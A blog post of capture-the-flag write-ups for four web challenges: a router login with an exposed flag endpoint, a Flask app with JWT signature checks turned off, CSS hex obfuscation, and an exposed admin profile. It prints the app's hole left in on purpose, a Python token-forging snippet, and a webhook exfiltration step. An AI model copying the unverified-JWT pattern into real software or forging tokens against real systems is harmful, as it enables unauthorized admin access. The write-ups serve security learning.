---
layout: post
title:  "Web Challenges"
date:   2026-06-03 05:46:00 -0400
author: robo.uzi
tags: [CTF]
permalink: /THEM-CTF-2026-part2-web/
---
* TOC
{:toc}

## a Cute Magical Router Gateway

**Category**: Web

**Author**: guavass

**Description**: A Router was found in the backrooms at THEM hq. Looks really old, "stone paper scissors" etched on the back, whatever that means. I plugged the router into power, visited the default gateway with no room for caution whatsoever. Since this was found at THEM hq, I feel like the password might contain the string "them", but I have no clue honestly. Pls help find the password :3

I went to the site and looked at the javascript on `view-source:http://4744ae83-dc05-4ded-ae70-5bab86499cfc.74.113.234.79.nip.io:8880/assets/index-B3EwX341.js`. It is a little over 9500 lines. At the bottom I see this:
```javascript
... etc
            case "Settings":
                return z.jsxs("div", {
                    children: [z.jsx("h2", {
                        children: "Settings"
                    }), z.jsx("p", {
                        children: "WiFi: Enabled"
                    }), z.jsx("p", {
                        children: "SSID: PiCKm3p15_53cur3"
                    }), z.jsx("p", {
                        children: "Password: ********"
                    }), z.jsx("p", {
                        children: "Guest Network: Disabled"
                    }), z.jsx("p", {
                        children: "Parental Controls: Active"
                    }), z.jsx("p", {
                        children: "QoS: Enabled"
                    }), z.jsx("p", {
                        children: "Time Zone: UTC-8"
                    }), z.jsx("p", {
                        children: "Auto-Update: Enabled"
                    })]
                });
            case "Logs":
                return z.jsxs("div", {
                    children: [z.jsx("h2", {
                        children: "System Logs"
                    }), z.jsxs("p", {
                        children: [el(), " - Web portal accessed", z.jsx("br", {}), z.jsx("code", {
                            children: N
                        })]
                    }), z.jsx("p", {
                        children: "05/29/2026 08:15 AM - System rebooted"
                    }), z.jsx("p", {
                        children: "05/28/2026 09:45 PM - New device connected"
                    }), z.jsx("p", {
                        children: "05/28/2026 06:30 PM - Firmware updated"
                    }), z.jsx("p", {
                        children: "05/27/2026 02:10 PM - Firewall rule added"
                    }), z.jsx("p", {
                        children: "05/26/2026 10:50 AM - Diagnostics completed"
                    }), z.jsx("p", {
                        children: "05/25/2026 04:20 PM - Broadband connection restored"
                    }), z.jsx("p", {
                        children: "05/24/2026 08:45 AM - Router temperature warning"
                    })]
                });
            default:
                return null
        }
    }, Rl = async F => {
        F.preventDefault();
        try {
            const yt = await (await fetch("/validate-password", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    username: U,
                    password: $
                })
            })).json();
            if (yt.success) {
                K(!0);
                try {
                    const Sl = await (await fetch("/flag")).json();
                    E(Sl.flag)
                } catch {
                    E("Failed to fetch flag")
                }
            } else alert(yt.message)
        } catch (rl) {
            console.error("Error:", rl), alert("An error occurred while validating the login.")
        }
    };
    return X ? z.jsxs("div", {
        className: "tabs-container",
        children: [z.jsx("div", {
            className: "tabs",
            children: p.map(F => z.jsx("button", {
                className: `tab-button ${il===F?"active":""}`,
                onClick: () => _l(F),
                children: F
            }, F))
        }), z.jsx("div", {
            className: "tab-content",
            children: Ul()
        })]
    }) : z.jsx("div", {
        className: "login-container",
        children: z.jsxs("div", {
            className: "login-box",
            children: [z.jsx("img", {
                src: "/THEMCTF.svg",
                alt: "THEMCTF Icon",
                className: "login-icon"
            }), z.jsxs("h1", {
                className: "login-title",
                children: [z.jsx("span", {
                    className: "login-title-large",
                    children: "A Cute Magical"
                }), z.jsx("span", {
                    className: "login-title-small",
                    children: "Router Login"
                })]
            }), z.jsxs("form", {
                onSubmit: Rl,
                children: [z.jsxs("div", {
                    className: "input-group",
                    children: [z.jsx("label", {
                        htmlFor: "username",
                        children: "Username"
                    }), z.jsx("input", {
                        type: "text",
                        id: "username",
                        name: "username",
                        placeholder: "Enter your username",
                        value: U,
                        onChange: F => vl(F.target.value)
                    })]
                }), z.jsxs("div", {
                    className: "input-group",
                    children: [z.jsx("label", {
                        htmlFor: "password",
                        children: "Password"
                    }), z.jsx("input", {
                        type: "password",
                        id: "password",
                        name: "password",
                        placeholder: "Enter your password",
                        value: $,
                        onChange: F => m(F.target.value)
                    })]
                }), z.jsx("button", {
                    type: "submit",
                    className: "login-button",
                    children: "Login"
                })]
            })]
        })
    })
};
Yo.createRoot(document.getElementById("root")).render(z.jsx(Sa.StrictMode, {
    children: z.jsx(Go, {})
}));
```

I wasnt able to guess a working password:
```shell
curl -X POST "http://c40f3d19-4ddb-4df4-94c9-1726c52b40a7.74.113.234.79.nip.io:8880/validate-password" -H "Content-Type: application/json" -d '{"username":"them","password":"PiCKm3p15_53cur3"}'  
{"message":"Invalid username or password","success":false}
```

I just went straight to `/flag` and it worked:
```shell
curl http://c40f3d19-4ddb-4df4-94c9-1726c52b40a7.74.113.234.79.nip.io:8880/flag  
{"flag":"THEM?!CTF{42e74ef3-b933-4100-9865-da5a25a6b236}"}
```

`THEM?!CTF{42e74ef3-b933-4100-9865-da5a25a6b236}`

___

## My Product

**Category**: Web

**Author**: BatoiDeA

**Description**: I tried my first website designed for a company and it's look like normal.

I get the challenge files:
```shell
unzip handout.zip  
Archive:  handout.zip  
   creating: handout/  
  inflating: handout/.env  
  inflating: handout/config.py  
  inflating: handout/docker-compose.yml  
  inflating: handout/models.py  
  inflating: handout/nginx.conf  
  inflating: handout/app.py  
  inflating: handout/requirements.txt  
   creating: handout/templates/  
  inflating: handout/templates/contact.html  
  inflating: handout/templates/staff_login.html  
  inflating: handout/templates/admin_inbox.html  
  inflating: handout/templates/admin_integrations.html  
  inflating: handout/templates/staff_register.html  
  inflating: handout/templates/index.html  
  inflating: handout/templates/staff_inbox.html  
  inflating: handout/templates/about.html  
  inflating: handout/templates/base.html  
  inflating: handout/templates/inquiry_view.html  
  inflating: handout/Dockerfile
```

Contents of `app.py`:
```python
from functools import wraps
from datetime import datetime, timedelta, timezone
import os
import threading
import time

import jwt
import requests
from flask import Flask, jsonify, request, redirect, url_for, render_template, make_response, flash, g

from config import Config
from models import (
    init_db,
    create_user,
    ensure_admin_user,
    authenticate_user,
    create_inquiry,
    list_staff_inquiries,
    get_inquiry,
    escalate_inquiry,
    list_escalated_inquiries,
    get_api_inquiry,
    get_webhook_url,
    set_webhook_url,
)

app = Flask(__name__)
app.config.from_object(Config)

init_db(app)
ensure_admin_user(app, os.getenv("ADMIN_PASSWORD", "local_admin_password_only"))

SECTORS = ["Harven Realty", "Harven Logistics", "Harven Tech"]


def create_token(user):
    payload = {
        "sub": str(user["id"]),
        "username": user["username"],
        "iat": datetime.now(timezone.utc),
        "exp": datetime.now(timezone.utc) + timedelta(hours=6),
    }
    return jwt.encode(payload, app.config["JWT_SECRET"], algorithm="HS256")


def decode_token(token):
    try:
        # Legacy SSO compatibility mode.
        return jwt.decode(token, options={"verify_signature": False})
    except (jwt.PyJWTError, KeyError, TypeError, ValueError):
        return None


def current_session_user():
    token = request.cookies.get("hv_session")
    if not token:
        return None
    payload = decode_token(token)
    if not payload:
        return None
    return {
        "id": int(payload["sub"]),
        "username": payload["username"],
        "is_admin": payload["username"] == "admin",
    }


def login_required(view):
    @wraps(view)
    def wrapped(*args, **kwargs):
        user = current_session_user()
        if not user:
            flash("Please sign in to continue.")
            return redirect(url_for("staff_login"))
        g.user = user
        return view(*args, **kwargs)
    return wrapped


def admin_required(view):
    @wraps(view)
    @login_required
    def wrapped(*args, **kwargs):
        if not g.user.get("is_admin"):
            return "Forbidden", 403, {"Content-Type": "text/plain; charset=utf-8"}
        return view(*args, **kwargs)
    return wrapped


def issue_session_response(user, destination):
    response = make_response(redirect(destination))
    response.set_cookie("hv_session", create_token(user), httponly=False, samesite="Lax")
    return response


def admin_reviewer_loop():
    while True:
        time.sleep(30)
        try:
            password = os.getenv("ADMIN_PASSWORD", "local_admin_password_only")
            with requests.Session() as session:
                session.post(
                    "http://127.0.0.1:5000/staff/login",
                    data={"username": "admin", "password": password},
                    timeout=5,
                )
                session.get("http://127.0.0.1:5000/admin/inbox", timeout=5)
        except Exception:
            pass


def start_background_tasks():
    if os.environ.get("WERKZEUG_RUN_MAIN") == "true" or not app.debug:
        thread = threading.Thread(target=admin_reviewer_loop, daemon=True)
        thread.start()


start_background_tasks()


@app.route("/", methods=["GET"])
def index():
    return render_template("index.html")


@app.route("/about", methods=["GET"])
def about():
    return render_template("about.html")


@app.route("/contact", methods=["GET", "POST"])
def contact():
    if request.method == "GET":
        return render_template("contact.html", sectors=SECTORS, sent=request.args.get("sent") == "1")

    sector = request.form.get("sector", "").strip()
    title = request.form.get("title", "").strip()
    message = request.form.get("message", "").strip()
    contact_name = request.form.get("contact_name", "").strip()
    contact_email = request.form.get("contact_email", "").strip()

    if sector not in SECTORS:
        sector = "Harven Realty"
    if not title or not message:
        flash("Title and message are required.")
        return redirect(url_for("contact"))

    user = current_session_user()
    user_id = user["id"] if user else None
    create_inquiry(app, user_id, sector, title, message, contact_name or None, contact_email or None)
    return redirect(url_for("contact", sent=1))


@app.route("/staff/register", methods=["GET", "POST"])
def staff_register():
    if request.method == "GET":
        return render_template("staff_register.html")

    username = request.form.get("username", "").strip()
    password = request.form.get("password", "")
    if not username or not password:
        flash("Username and password are required.")
        return redirect(url_for("staff_register"))
    if username == "admin":
        flash("That account is reserved.")
        return redirect(url_for("staff_register"))

    user_id = create_user(app, username, password)
    if user_id is None:
        flash("That username is already registered.")
        return redirect(url_for("staff_register"))
    return issue_session_response({"id": user_id, "username": username}, url_for("staff_inbox"))


@app.route("/staff/login", methods=["GET", "POST"])
def staff_login():
    if request.method == "GET":
        return render_template("staff_login.html")

    username = request.form.get("username", "").strip()
    password = request.form.get("password", "")
    user = authenticate_user(app, username, password)
    if not user:
        flash("Invalid portal credentials.")
        return redirect(url_for("staff_login"))
    return issue_session_response(user, url_for("admin_inbox") if user["username"] == "admin" else url_for("staff_inbox"))


@app.route("/staff/logout", methods=["POST"])
def staff_logout():
    response = make_response(redirect(url_for("index")))
    response.delete_cookie("hv_session")
    return response


@app.route("/staff/inbox", methods=["GET"])
@login_required
def staff_inbox():
    return render_template("staff_inbox.html", user=g.user, inquiries=list_staff_inquiries(app, g.user["id"]))


@app.route("/staff/inquiry/<int:inquiry_id>", methods=["GET"])
@login_required
def inquiry_view(inquiry_id):
    inquiry = get_inquiry(app, g.user["id"], inquiry_id, include_all=g.user.get("is_admin"))
    if not inquiry:
        flash("Inquiry not found.")
        return redirect(url_for("staff_inbox"))
    return render_template("inquiry_view.html", user=g.user, inquiry=inquiry)


@app.route("/staff/inquiry/<int:inquiry_id>/escalate", methods=["POST"])
@login_required
def inquiry_escalate(inquiry_id):
    if not escalate_inquiry(app, g.user["id"], inquiry_id):
        flash("Inquiry not found.")
        return redirect(url_for("staff_inbox"))
    flash("Inquiry escalated for review.")
    return redirect(url_for("inquiry_view", inquiry_id=inquiry_id))


@app.route("/admin/inbox", methods=["GET"])
@admin_required
def admin_inbox():
    return render_template("admin_inbox.html", user=g.user, inquiries=list_escalated_inquiries(app))


@app.route("/admin/integrations", methods=["GET", "POST"])
@admin_required
def admin_integrations():
    if request.method == "POST":
        webhook_url = request.form.get("webhook_url", "").strip()
        set_webhook_url(app, webhook_url or None)
        flash("Integration endpoint saved.")
        return redirect(url_for("admin_integrations"))
    return render_template("admin_integrations.html", user=g.user, webhook_url=get_webhook_url(app) or "")


@app.route("/admin/integrations/sync", methods=["POST"])
@admin_required
def admin_integrations_sync():
    webhook_url = get_webhook_url(app)
    if webhook_url:
        try:
            requests.post(
                webhook_url,
                json={"flag": os.environ.get("FLAG")}
            )
        except requests.RequestException:
            pass
    return "OK", 200, {"Content-Type": "text/plain; charset=utf-8"}


@app.route("/api/inquiry/<int:inquiry_id>", methods=["GET"])
def api_inquiry(inquiry_id):
    inquiry = get_api_inquiry(app, inquiry_id)
    if not inquiry:
        return jsonify({"error": "not found"}), 404
    return jsonify({"id": inquiry["id"], "sector": inquiry["sector"], "status": "pending"})


@app.route("/export/<path:inquiry_id>", methods=["GET"])
def export_inquiry(inquiry_id):
    return "Export queued.", 200, {"Content-Type": "text/plain; charset=utf-8"}


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=False)
```

The `decode_token` function disables signature verification:
```python
def decode_token(token):
    try:
        # Legacy SSO compatibility mode.
        return jwt.decode(token, options={"verify_signature": False})
    except (jwt.PyJWTError, KeyError, TypeError, ValueError):
        return None
```
This allows an attacker to forge a valid token with arbitrary claims. This way you can gain admin access without a password. 

Once an attacker has admin access, they can set a webhook url (on `/admin/integrations`) to a webhook they control. Once the sync endpoint (`/admin/integrations/sync`) is triggered, the flag will be posted to that webhook. 

I go to the site at `http://3afb7359-ec00-4085-bc27-8bcef5e58a12.74.113.234.79.nip.io:8880/`:

![Alt text](/images/themctf2026web1part2.png)

I forge an admin jwt like this:
```shell
python3  
Python 3.13.5 (main, May  5 2026, 21:05:52) [GCC 14.2.0] on linux  
Type "help", "copyright", "credits" or "license" for more information.  
>>> import jwt  
... import requests  
...  
... payload = {  
...     "sub": "1",  
...     "username": "admin",  
...     "exp": 9999999999  
... }  
...  
... token = jwt.encode(payload, "dummy_secret_dont_matter_none", algorithm="HS256")  
... print(token)  
...  
/home/user/Desktop/ctf/venv/lib/python3.13/site-packages/jwt/api_jwt.py:147: InsecureKeyLengthWarning: The HMAC key is 29 bytes long, which is below the minimum recommended length of 32 bytes for SHA256. See RFC 7518 Section 3.2.  
return self._jws.encode(eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwidXNlcm5hbWUiOiJhZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0.DpAJ56YVQvmC7K448hswmePumQYm_K-6Myd1NqLChN4
>>> exit
```

Make a cookie called `hv_session` and enter the forged jwt. Then I can visit `http://751a36f5-b019-4f8e-9646-c1183bc095ee.74.113.234.79.nip.io:8880/admin/integrations`:

![Alt text](/images/themctf2026web2part2.png)

I enter my webhook into the `Webhook Endpoint URL` box and click `Sync CRM Event` which makes a POST request to my webhook with the flag:

![Alt text](/images/themctf2026web3part2.png)

All of this works because:
- `decode_token` ignores signature verification
- the admin privilege is derived from the `username` claim being `admin`
- the `/admin/integrations/sync` endpoint makes an HTTP request to the stored webhook URL with the flag in the JSON body

`THEM?!CTF{febb69d8-6693-47d3-bd9e-b0b708fdcee4}`

___

## The Style of Deception (Static)

**Category**: Web

**Author**: F3L0N :)

**Description**: Everything is surely loaded, or is it not?

I download the challenge files:
```shell
unzip Style_of_Deception.zip  
Archive:  Style_of_Deception.zip  
   creating: Style of Deception/  
  inflating: Style of Deception/index.html  
  inflating: Style of Deception/reset.css  
  inflating: Style of Deception/style.css  
  inflating: Style of Deception/theme.css
```

`index.html`:
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>uh huh?</title>

    <link rel="stylesheet" href="reset.css">
    <link rel="stylesheet" href="style.css">

    <!-- Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">

    <style>
        body {
            margin: 0;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: 'Inter', sans-serif;
            background: linear-gradient(-45deg, #0a0a0a, #111, #0d0d0d, #050505);
            background-size: 400% 400%;
            animation: gradientShift 12s ease infinite;
            overflow: hidden;
        }

        @keyframes gradientShift {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        .card {
            position: relative;
            background: rgba(255, 255, 255, 0.03);
            backdrop-filter: blur(16px);
            border: 1px solid rgba(255,255,255,0.08);
            border-radius: 24px;
            padding: 45px 55px;
            width: 440px;
            text-align: center;
            box-shadow: 0 25px 80px rgba(0,0,0,0.8);
            animation: fadeIn 1s ease forwards;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(20px) scale(0.98);
            }
            to {
                opacity: 1;
                transform: translateY(0) scale(1);
            }
        }

        .card::before {
            content: "";
            position: absolute;
            inset: -2px;
            border-radius: 24px;
            background: linear-gradient(120deg, transparent, rgba(0,255,255,0.2), transparent);
            opacity: 0;
            transition: 0.4s;
        }

        .card:hover::before {
            opacity: 1;
        }

        h1 {
            margin: 0;
            font-weight: 600;
            font-size: 28px;
            color: #ffffff;
            letter-spacing: 0.6px;
        }

        h1 span {
            background: linear-gradient(90deg, #00fff7, #00aaff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        p {
            margin-top: 12px;
            color: #aaa;
            font-size: 14px;
            line-height: 1.5;
        }

        .grid {
            margin-top: 35px;
            display: grid;
            grid-template-columns: repeat(5, 1fr);
            gap: 14px;
            justify-items: center;
        }

        .grid div {
            width: 42px;
            height: 42px;
            border-radius: 12px;
            background: linear-gradient(145deg, #1f1f1f, #121212);
            box-shadow: inset 0 0 8px rgba(255,255,255,0.05),
                        0 6px 18px rgba(0,0,0,0.7);
            transition: all 0.25s ease;
            animation: float 3s ease-in-out infinite;
        }

        .grid div:nth-child(even) {
            animation-delay: 0.5s;
        }

        .grid div:nth-child(3n) {
            animation-delay: 1s;
        }

        @keyframes float {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-6px); }
        }

        .grid div:hover {
            transform: scale(1.1);
            box-shadow: 0 0 18px rgba(0,255,255,0.25);
        }

        .footer {
            margin-top: 28px;
            font-size: 11px;
            color: #666;
            letter-spacing: 1px;
            font-family: 'JetBrains Mono', monospace;
        }

        .hidden {
            display: none;
        }
    </style>
</head>
<body>

<div class="card">
    <h1><span>Everything</span> you need is loaded.</h1>
    <p>Look closer. Patterns reveal more than appearances.</p>

    <div class="grid">
        <div data-i="13"></div>
        <div data-i="2"></div>
        <div data-i="17"></div>
        <div data-i="5"></div>
        <div data-i="19"></div>
        <div data-i="1"></div>
        <div data-i="11"></div>
        <div data-i="7"></div>
        <div data-i="3"></div>
        <div data-i="15"></div>
        <div data-i="9"></div>
        <div data-i="4"></div>
        <div data-i="20"></div>
        <div data-i="6"></div>
        <div data-i="8"></div>
        <div data-i="10"></div>
        <div data-i="12"></div>
        <div data-i="14"></div>
        <div data-i="16"></div>
        <div data-i="18"></div>
    </div>

    <div class="footer">
        nothing interesting here • or is there?
    </div>
</div>

<div class="hidden">THEM?!CTF{7RY_H4RD3R_BRUH}</div>

</body>
</html>
```

`reset.css`:
```css
* {
    margin: 0;
    padding: 0;
}

.grid div:nth-child(3n)::after {
    content: "Y";
}
```

`style.css`:
```css
body {
    background: #0f0f0f;
    color: #eee;
    font-family: monospace;
    text-align: center;
}

.grid div {
    width: 18px;
    height: 18px;
    margin: 3px;
    display: inline-block;
    background: #1a1a1a;
    position: relative;
}

@import url("theme.css");

.grid div:nth-child(2n)::after {
    content: "X";
}

.grid div::after {
    opacity: 0;
    font-size: 0;
}
```

`theme.css`:
```css
:root {
    --c1: "\54"; --c2: "\48"; --c3: "\45"; --c4: "\4d";
    --c5: "\3f"; --c6: "\21"; --c7: "\43"; --c8: "\54";
    --c9: "\46"; --c10: "\7b"; --c11: "\43"; --c12: "\53";
    --c13: "\53"; --c14: "\5f"; --c15: "\4d"; --c16: "\34";
    --c17: "\47"; --c18: "\31"; --c19: "\43"; --c20: "\7d";
}

.grid div:nth-child(1)::after  { content: var(--c13); }
.grid div:nth-child(2)::after  { content: var(--c2); }
.grid div:nth-child(3)::after  { content: var(--c17); }
.grid div:nth-child(4)::after  { content: var(--c5); }
.grid div:nth-child(5)::after  { content: var(--c19); }
.grid div:nth-child(6)::after  { content: var(--c1); }
.grid div:nth-child(7)::after  { content: var(--c11); }
.grid div:nth-child(8)::after  { content: var(--c7); }
.grid div:nth-child(9)::after  { content: var(--c3); }
.grid div:nth-child(10)::after { content: var(--c15); }
.grid div:nth-child(11)::after { content: var(--c9); }
.grid div:nth-child(12)::after { content: var(--c4); }
.grid div:nth-child(13)::after { content: var(--c20); }
.grid div:nth-child(14)::after { content: var(--c6); }
.grid div:nth-child(15)::after { content: var(--c8); }
.grid div:nth-child(16)::after { content: var(--c10); }
.grid div:nth-child(17)::after { content: var(--c12); }
.grid div:nth-child(18)::after { content: var(--c14); }
.grid div:nth-child(19)::after { content: var(--c16); }
.grid div:nth-child(20)::after { content: var(--c18); }
```

In `style.css` the import statement for `theme.css` is not at the top of the file, meaning it is ignored. There is a fake flag in `index.html`. 

The actual flag data is hidden as a series of hex encoded CSS variables (`--c1` to `--c20`) in `theme.css`:
```css
:root {
    --c1: "\54"; --c2: "\48"; --c3: "\45"; --c4: "\4d";
    --c5: "\3f"; --c6: "\21"; --c7: "\43"; --c8: "\54";
    --c9: "\46"; --c10: "\7b"; --c11: "\43"; --c12: "\53";
    --c13: "\53"; --c14: "\5f"; --c15: "\4d"; --c16: "\34";
    --c17: "\47"; --c18: "\31"; --c19: "\43"; --c20: "\7d";
}
```

I use `grep` to extract the hex codes, `tr` to clean them up, and `xxd` to convert them to text:
```shell
grep -oP '"\\\K[0-9a-fA-F]+' theme.css | tr -d '\n' | xxd -r -p; echo ""  
THEM?!CTF{CSS_M4G1C}
```

`THEM?!CTF{CSS_M4G1C}`

___

## meh

**Category**: Web

**Author**: ztzganteng

**Description**: eXl5eXl5bWxz
Connection: [http://45.130.164.173:30205/](http://45.130.164.173:30205/)

I download the challenge files:
```shell
unzip dist.zip  
Archive:  dist.zip  
   creating: backend/  
  inflating: __MACOSX/._backend  
  inflating: backend/go.mod  
  inflating: __MACOSX/backend/._go.mod  
  inflating: backend/Dockerfile  
  inflating: __MACOSX/backend/._Dockerfile  
  inflating: backend/main.go  
  inflating: __MACOSX/backend/._main.go  
   creating: bot/  
  inflating: __MACOSX/._bot  
  inflating: bot/Dockerfile  
  inflating: __MACOSX/bot/._Dockerfile  
  inflating: bot/package.json  
  inflating: __MACOSX/bot/._package.json  
  inflating: bot/bot.js  
  inflating: __MACOSX/bot/._bot.js  
  inflating: docker-compose.yml  
  inflating: __MACOSX/._docker-compose.yml  
   creating: web/  
  inflating: __MACOSX/._web  
  inflating: web/.DS_Store  
  inflating: __MACOSX/web/._.DS_Store  
  inflating: web/Dockerfile  
  inflating: __MACOSX/web/._Dockerfile  
  inflating: web/astro.config.mjs  
  inflating: __MACOSX/web/._astro.config.mjs  
  inflating: web/package-lock.json  
  inflating: __MACOSX/web/._package-lock.json  
  inflating: web/package.json  
  inflating: __MACOSX/web/._package.json  
   creating: web/src/  
  inflating: __MACOSX/web/._src  
   creating: web/src/components/  
  inflating: __MACOSX/web/src/._components  
   creating: web/src/layouts/  
  inflating: __MACOSX/web/src/._layouts  
  inflating: web/src/middleware.js  
  inflating: __MACOSX/web/src/._middleware.js  
   creating: web/src/lib/  
  inflating: __MACOSX/web/src/._lib  
   creating: web/src/pages/  
  inflating: __MACOSX/web/src/._pages  
  inflating: web/src/layouts/Layout.astro  
  inflating: __MACOSX/web/src/layouts/._Layout.astro  
  inflating: web/src/lib/auth.js  
  inflating: __MACOSX/web/src/lib/._auth.js  
  inflating: web/src/pages/register.astro  
  inflating: __MACOSX/web/src/pages/._register.astro  
  inflating: web/src/pages/index.astro  
  inflating: __MACOSX/web/src/pages/._index.astro  
  inflating: web/src/pages/logout.astro  
  inflating: __MACOSX/web/src/pages/._logout.astro  
  inflating: web/src/pages/login.astro  
  inflating: __MACOSX/web/src/pages/._login.astro  
  inflating: web/src/pages/flag.astro  
  inflating: __MACOSX/web/src/pages/._flag.astro  
   creating: web/src/pages/profile/  
  inflating: __MACOSX/web/src/pages/._profile  
   creating: web/src/pages/api/  
  inflating: __MACOSX/web/src/pages/._api  
  inflating: web/src/pages/settings.astro  
  inflating: __MACOSX/web/src/pages/._settings.astro  
  inflating: web/src/pages/profile/[username].astro  
  inflating: __MACOSX/web/src/pages/profile/._[username].astro  
  inflating: web/src/pages/api/proxy.ts  
  inflating: __MACOSX/web/src/pages/api/._proxy.ts  
  inflating: web/src/pages/api/visit.ts  
  inflating: __MACOSX/web/src/pages/api/._visit.ts
```

After reading over the source code I went to the site and created an account and logged in. I tried a few different things, but eventually just visited `/profile/admin`. Go to: `http://45.130.164.173:30205/profile/admin` and get the flag:
```shell
curl http://45.130.164.173:30205/profile/admin
<!DOCTYPE html>
<html lang="en" data-astro-cid-sckkx6r4>
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>admin&#39;s Profile - Meh</title>
    <style>
    ... css stuff etc ...
    </style>
  </head>
  <body data-astro-cid-sckkx6r4>
    <div class="nav" data-astro-cid-sckkx6r4>
      <a href="/" data-astro-cid-sckkx6r4>Home</a>
      <a href="/login" data-astro-cid-sckkx6r4>Login</a>
      <a href="/register" data-astro-cid-sckkx6r4>Register</a>
    </div>
    <h1>admin's User Profile</h1>
    <div class="card">
      <script>
        (function() {
          const handle = "admin";
          const signature = "THEM?!CTF{an0ther_4noth3r_sh1t_ch4lleng3_f5bc552656c9a3d06c3f890}";
          window.MehProfile = {
            handle,
            signature
          };
        })();
      </script>
      <p>
        <strong>Username:</strong> admin
      </p>
      <p>
        <strong>Constellation:</strong> THEM?!CTF{an0ther_4noth3r_sh1t_ch4lleng3_f5bc552656c9a3d06c3f890}
      </p>
    </div>
  </body>
</html>
```

`THEM?!CTF{an0ther_4noth3r_sh1t_ch4lleng3_f5bc552656c9a3d06c3f890}`
